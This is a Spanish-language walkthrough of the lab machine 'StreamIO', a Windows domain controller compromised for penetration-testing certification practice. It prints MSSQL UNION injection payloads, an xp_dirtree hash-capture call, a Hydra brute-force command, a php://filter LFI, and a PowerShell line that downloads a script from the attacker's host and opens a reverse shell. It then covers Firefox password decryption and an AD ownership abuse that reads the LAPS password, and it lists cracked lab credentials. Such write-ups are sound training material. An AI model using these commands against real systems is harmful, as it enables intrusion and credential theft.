---
title: "StreamIO (Medium)"
date: 2026-11-07
author: "Isma"
slug: "streamio"
tags: ["Windows", "AD", "SQL injection", "MSSQL", "LFI", "Hash Cracking", "Firefox Credentials", "BloodHound", "ACL Abuse", "LAPS"]
categories: ["Machine", "CPTS Preparation"]
draft: false
source: "obsidian"
---

## Resumen

StreamIO es un controlador de dominio Windows que aloja una plataforma ficticia de streaming de películas. Es una máquina muy completa que mezcla web y Active Directory: una **inyección SQL UNION en MSSQL** en el buscador de `watch.streamio.htb` me da los hashes MD5 de los usuarios de la web, que crackeo y uso para entrar en el login de `streamio.htb`. Desde el panel de administración, un parámetro oculto `debug` permite un **LFI** con `php://filter` para leer el código fuente, y `master.php` contiene un `eval(file_get_contents(...))` que convierte el LFI en **RCE** cargando un fichero remoto. Con las credenciales de base de datos encontradas en el código accedo a la base `streamio_backup`, de donde saco la contraseña de `nikk37`. Ya en la máquina, descifro las **contraseñas guardadas en Firefox** y obtengo las credenciales de `JDgodd`, que según **BloodHound** es propietario del grupo `Core Staff`, el cual puede leer la contraseña **LAPS** del DC. Me añado al grupo, leo la contraseña del administrador local y la máquina cae.

## Reconocimiento

Empiezo con un escaneo de puertos:

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-08-18 19:16:55Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
|_http-title: Not Found
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m56s, deviation: 0s, median: 6h59m56s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Es el **controlador de dominio** de `streamIO.htb`, con IIS en los puertos 80 y 443 y WinRM abierto. Lo más interesante está en el certificado TLS del 443: su *Subject Alternative Name* incluye `streamIO.htb` y **`watch.streamIO.htb`**, así que añado ambos vhosts a `/etc/hosts`. También me apunto el `clock-skew` de unas 7 horas por si luego uso Kerberos.

### Web

El puerto 80 solo muestra la página por defecto de IIS:

![streamio](/images/obsidian/streamio/pasted-image-20260818141749.png)

En el 443, la raíz por IP devuelve *Not Found*, pero con el nombre de host correcto aparecen dos aplicaciones. `https://streamio.htb` es la web principal de la plataforma, con un **login** y un formulario de registro:

![streamio](/images/obsidian/streamio/pasted-image-20260818162733.png)

Y `https://watch.streamio.htb` es una página de suscripción a novedades:

![streamio](/images/obsidian/streamio/pasted-image-20260818150428.png)

Lanzo fuzzing recursivo de directorios y ficheros PHP sobre los dos vhosts:

```bash
feroxbuster -u https://watch.streamio.htb/ -k -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o ferxobusterwatch
```

```
200      GET     7193l    19558w   253905c https://watch.streamio.htb/search.php
200      GET       78l      245w     2829c https://watch.streamio.htb/index.php
200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php
```

En `watch` aparece un buscador de películas, **`search.php`**, y una página `blocked.php`. En `streamio.htb` encuentro el login, el registro y un directorio `/admin/` (con un `master.php`) que de momento no puedo usar sin sesión.

Pruebo a registrar una cuenta en `streamio.htb/register.php`. La web dice que la cuenta se ha creado, pero luego el login falla: los usuarios nuevos no quedan activos, así que necesito credenciales reales.

![streamio](/images/obsidian/streamio/pasted-image-20260818162921.png)

![streamio](/images/obsidian/streamio/pasted-image-20260818162959.png)

## Acceso Inicial (Foothold)

### SQL injection en search.php

El buscador envía un POST con un único parámetro `q`:

![streamio](/images/obsidian/streamio/pasted-image-20260818163910.png)

Si meto un payload clásico de inyección (`' or 1=1-- -`, etc.) salta un WAF muy básico que me redirige a `blocked.php` y bloquea la sesión durante 5 minutos:

![streamio](/images/obsidian/streamio/pasted-image-20260818163044.png)

Para entender cómo se procesa la entrada sin quemar la sesión, fuzzeo el parámetro con caracteres especiales y filtro la respuesta "normal" por número de líneas:

```bash
ffuf -u https://watch.streamio.htb/search.php -d "q=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -fl 34
```

![streamio](/images/obsidian/streamio/pasted-image-20260818164125.png)

Los tres últimos caracteres devuelven **la lista entera de películas**:

- `%` es el comodín de cualquier cadena en `LIKE`.
- `_` es el comodín de un solo carácter en `LIKE`.
- `&` sin codificar (tal como lo manda ffuf) corta el parámetro, la búsqueda queda vacía y también devuelve todo.

Que `%` y `_` actúen como comodines delata que la consulta del backend es algo del estilo:

```sql
SELECT * FROM movies WHERE title LIKE '%<input>%'
```

Para una **UNION injection** me interesa que la parte original no devuelva nada, de modo que en la página solo aparezcan mis filas. Uso un término que no coincide con ninguna película (`500`), cierro la comilla y voy aumentando el número de columnas hasta que la respuesta pinta un resultado (el bloque `<div class="mr-auto p-2">`):

```
q=500' union select 1,2,3,4,5,6-- -
```

![streamio](/images/obsidian/streamio/pasted-image-20260819001308.png)

La tabla tiene **6 columnas** y la segunda se refleja en la página. Compruebo el motor con `@@version`:

```
q=500' union select 1,@@version,3,4,5,6-- -
```

![streamio](/images/obsidian/streamio/pasted-image-20260819002948.png)

Es **Microsoft SQL Server 2019 Express**.

### Robo de hash NetNTLMv2 con xp_dirtree

En MSSQL, el procedimiento `xp_dirtree` intenta listar una ruta UNC; si la ruta apunta a mi máquina, el servicio se autentica contra mí por SMB y puedo capturar el hash NetNTLMv2 de la cuenta que ejecuta SQL Server. Levanto Responder e inyecto la llamada:

```bash
responder -I tun0
```

```
EXEC xp_dirtree '\\10.10.15.252\own'
```

![streamio](/images/obsidian/streamio/pasted-image-20260819002600.png)

```
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:aaa125f2e3a7a8e0:E0A9B824AEB0F9BBAC65F9C594394F8F:0101000000...
```

El servicio corre como la **cuenta de máquina `DC$`**, cuya contraseña es aleatoria y larga, así que crackearla no es viable. Descarto esta vía y sigo enumerando la base de datos.

### Enumeración de la base de datos

Bases de datos disponibles, agregadas en una sola fila con `string_agg`:

```
q=500' union select 1,(select string_agg(name,',') from sys.databases),3,4,5,6-- -
```

![streamio](/images/obsidian/streamio/pasted-image-20260819142405.png)

Además de las del sistema hay **`STREAMIO`** y **`streamio_backup`**. Las tablas de la base actual (`STREAMIO`) son `movies` y `users`:

```
q=500' union select 1,(select string_agg(table_name,',') from information_schema.tables),3,4,5,6-- -
```

![streamio](/images/obsidian/streamio/pasted-image-20260819142702.png)

> **string_agg**
> El `UNION SELECT` externo devuelve una sola fila (`1, "tabla1,tabla2,...", 3, 4, 5, 6`), porque toda la agregación ocurre dentro del subselect. Es muy cómodo cuando la página solo muestra pocas filas o cuando hay muchos resultados.

Intento lo mismo contra `streamio_backup.information_schema.tables`, pero desde la inyección no consigo sacar nada de esa base (más adelante la leeré con otro usuario). Veo las columnas de `users`:

```
q=500' UNION select 1,COLUMN_NAME,3,4,5,6 from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```

![streamio](/images/obsidian/streamio/pasted-image-20260819144423.png)

Hay `id`, `username`, `password` e `is_staff`. Saco los nombres de usuario sin problema:

```
q=500' union select 1,username,3,4,5,6 from users-- -
```

![streamio](/images/obsidian/streamio/pasted-image-20260819151511.png)

Pero al pedir `password` la página vuelve vacía. El motivo es la **collation**: la configuración que define cómo SQL Server compara y combina cadenas (codificación, sensibilidad a mayúsculas, orden...). Cada columna puede tener la suya, y la columna `password` tenía una collation distinta a la de la columna de la consulta original en esa posición del UNION. SQL Server lanza entonces `Cannot resolve the collation conflict ... in the UNION operation`, pero la aplicación se traga el error y solo muestra un resultado vacío. Un `CAST(password AS VARCHAR(255))` no lo arregla, porque cambia el tipo pero no la collation. Lo que sí funciona es forzarla explícitamente:

```
q=500' union select 1,password COLLATE SQL_Latin1_General_CP1_CI_AS,3,4,5,6 from users-- -
```

### Crackeo de los hashes

Obtengo 30 hashes MD5 sin sal y los crackeo con hashcat (modo `0`):

```bash
hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes --show
```

```
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
3577c47eb1e12c8ba021611e1280753c:highschoolmusical
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
665a50ac9eaa781e4f7f04199db97a11:paddpadd
6dcd87740abb64edfa36d170f0d5450d:$3xybitch
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
ef8f3d30a856cf166fb8215aca93e9ff:%$clara
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```

Creo una wordlist con las contraseñas crackeadas y otra con los 30 nombres de usuario extraídos (`admin`, `Barry`, `James`, `Sabrina`, `yoshihide`...):

```bash
hashcat -m 0 hashes --show | cut -d: -f2 > cracked_passwords.txt
```

### Fuerza bruta del login

En vez de emparejar cada hash con su usuario, pruebo todas las combinaciones contra el login de `streamio.htb` con Hydra, usando el mensaje *Login failed* como condición de fallo:

```bash
hydra -L users.txt -P cracked_passwords.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

![streamio](/images/obsidian/streamio/pasted-image-20260819152809.png)

```
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
```

Con `yoshihide` tengo acceso al **panel de administración** en `/admin/`:

![streamio](/images/obsidian/streamio/pasted-image-20260819152943.png)

### LFI en el parámetro debug

Fuzzeo nombres de parámetro GET en `/admin/` (con la cookie de sesión de `yoshihide`) y encuentro uno oculto: **`debug`**, que muestra el mensaje *"this option is for developers only"* e incluye el fichero que se le pase.

Pruebo varios payloads de LFI y el que funciona es el wrapper `php://filter`, que me devuelve el código fuente en base64 en vez de ejecutarlo:

```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```

![streamio](/images/obsidian/streamio/pasted-image-20260820192153.png)

Hago lo mismo con `master.php` y decodifico ambos:

![streamio](/images/obsidian/streamio/pasted-image-20260820192418.png)

`index.php` contiene las **credenciales de la base de datos**:

```php
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);
```

Y `master.php` tiene la pieza clave para el RCE:

```php
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
```

### De LFI a RCE

`master.php` hace `eval()` del contenido que devuelva `file_get_contents()` sobre el parámetro POST `include`. Como `file_get_contents` acepta URLs, puedo apuntarlo a un fichero servido desde mi máquina y el servidor ejecutará el PHP que yo quiera. Para llegar a `master.php` con sesión de admin, lo incluyo a través de `?debug=master.php`.

Primero compruebo que el servidor hace la petición saliente:

![streamio](/images/obsidian/streamio/pasted-image-20260820193039.png)

![streamio](/images/obsidian/streamio/pasted-image-20260820193100.png)

Funciona. Preparo `test.php` (sin etiquetas `<?php`, porque `eval` espera código PHP directo) para descargar y lanzar **ConPtyShell**, una reverse shell de PowerShell totalmente interactiva:

```php
system("powershell IEX(IWR http://10.10.15.252/shell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.15.252 4444");
```

- https://github.com/antonioCoco/ConPtyShell

Sirvo ambos ficheros con `python -m http.server 80`, me pongo a la escucha en el 4444 y envío `include=http://10.10.15.252/test.php`:

![streamio](/images/obsidian/streamio/pasted-image-20260820195635.png)

![streamio](/images/obsidian/streamio/pasted-image-20260820195623.png)

Tengo shell como `streamio\yoshihide` en `C:\inetpub\streamio.htb\admin`. PowerShell se queja de no poder escribir el historial de PSReadLine, pero la shell funciona:

![streamio](/images/obsidian/streamio/pasted-image-20260820195911.png)

## Movimiento Lateral

### Base de datos streamio_backup

Desde la inyección no pude leer `streamio_backup`, pero con las credenciales de `db_admin` sí. Me conecto con `sqlcmd` desde la shell:

```powershell
sqlcmd -U db_admin -P 'B1@hx31234567890'
```

```sql
USE streamio_backup
GO
SELECT table_name FROM information_schema.tables;
GO
SELECT * FROM users
GO
```

![streamio](/images/obsidian/streamio/pasted-image-20260820215621.png)

```
id  username   password
1   nikk37     389d14cb8e4e9b94b137deb1caf0612a
2   yoshihide  b779ba15cedfd22a023c4d8bcf5f2332
3   James      c660060492d9edcaa8332d89c99c9239
...
```

La copia de seguridad contiene un usuario que no estaba en la base principal: **`nikk37`**, que además es usuario del dominio. Crackeo su MD5 (en este caso con CrackStation):

![streamio](/images/obsidian/streamio/pasted-image-20260820215756.png)

```
nikk37 : get_dem_girls2@yahoo.com
```

`nikk37` tiene acceso por WinRM, así que entro y capturo la **User Flag**:

```bash
evil-winrm -i streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

![streamio](/images/obsidian/streamio/pasted-image-20260820215930.png)

### Contraseñas guardadas en Firefox

Ejecuto `winPEAS.ps1` y detecta un perfil de **Firefox** con credenciales guardadas en:

```
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\
```

Firefox guarda los usuarios y contraseñas cifrados en `logins.json`, y la clave para descifrarlos en `key4.db`. Si el usuario no ha puesto una *Primary Password*, esa clave se puede recuperar sin conocer nada más. Descargo ambos ficheros:

```powershell
download key4.db
download logins.json
```

Y los descifro con **firepwd**:

- https://github.com/lclevy/firepwd

```bash
python3 firepwd.py
```

![streamio](/images/obsidian/streamio/virtualboxvm_vctl0g2xvd.png)

```
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

Son credenciales de un Slack interno. El usuario interesante es **`JDgodd`**, que existe en el dominio, pero su contraseña de la entrada (`password@12`) no es la buena: la que funciona para `JDgodd` en el dominio es la de la entrada `admin`, **`JDg0dd1s@d0p3cr3@t0r`** (el propio nombre lo delata).

## Escalada de Privilegios

### BloodHound

Con `JDgodd` recolecto información del dominio:

```bash
rusthound-ce -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -c All
bloodhound-python -k -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb -dc DC.streamio.htb -ns 10.129.109.247 -c All --zip
```

![streamio](/images/obsidian/streamio/pasted-image-20260822132105.png)

El camino es claro:

- `JDgodd` tiene **Owns** sobre el grupo **`Core Staff`**.
- `Core Staff` tiene **ReadLAPSPassword** sobre el equipo `DC.streamio.htb`.

**LAPS** guarda la contraseña aleatoria del administrador local de cada equipo en el atributo `ms-Mcs-AdmPwd` de su objeto en AD, y solo la pueden leer los principales autorizados. En un DC, el "administrador local" es el `Administrator` del dominio.

### Abuso de Owns: añadirme a Core Staff

Ser **propietario** de un objeto permite modificar su DACL aunque no tenga ningún otro permiso explícito. Me concedo `WriteMembers` sobre `Core Staff` y después me añado al grupo:

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'JDgodd' -target 'Core Staff' 'streamio.htb'/'JDgodd':'JDg0dd1s@d0p3cr3@t0r'
```

```
[*] DACL backed up to dacledit-20260822-132441.bak
[*] DACL modified successfully!
```

```bash
net rpc group addmem "Core Staff" "JDgodd" -U "streamio.htb"/"JDgodd"%"JDg0dd1s@d0p3cr3@t0r" -S 10.129.109.247
```

### Lectura de la contraseña LAPS

Ya como miembro de `Core Staff`, leo el atributo LAPS del DC con bloodyAD:

```bash
bloodyAD --host 10.129.109.247 -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

![streamio](/images/obsidian/streamio/pasted-image-20260822132828.png)

```
distinguishedName: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: 4y6.79eGdKj]4M
```

Compruebo la contraseña contra el DC como `Administrator`:

```bash
nxc smb 10.129.109.247 -u Administrator -p '4y6.79eGdKj]4M'
```

![streamio](/images/obsidian/streamio/pasted-image-20260822132935.png)

`Pwn3d!`: tengo acceso como administrador del dominio, máquina comprometida y **Root Flag** capturada.

## Conclusiones

- Un WAF basado en palabras clave no sustituye a las consultas parametrizadas: con un término de búsqueda inocuo y `UNION` bastó para volcar la base de datos, y los hashes MD5 sin sal cayeron en segundos.
- Un parámetro de depuración olvidado en producción (`debug`) y un `eval(file_get_contents(...))` sobre entrada del usuario convierten un panel de administración en RCE directo.
- Las copias de seguridad de bases de datos y los gestores de contraseñas del navegador son fuentes de credenciales tan valiosas como el propio AD; aquí encadenaron dos saltos de usuario.
- La propiedad (**Owns**) sobre un grupo equivale a control total sobre él. Si ese grupo puede leer LAPS del DC, cualquier propietario del grupo es en la práctica administrador del dominio.
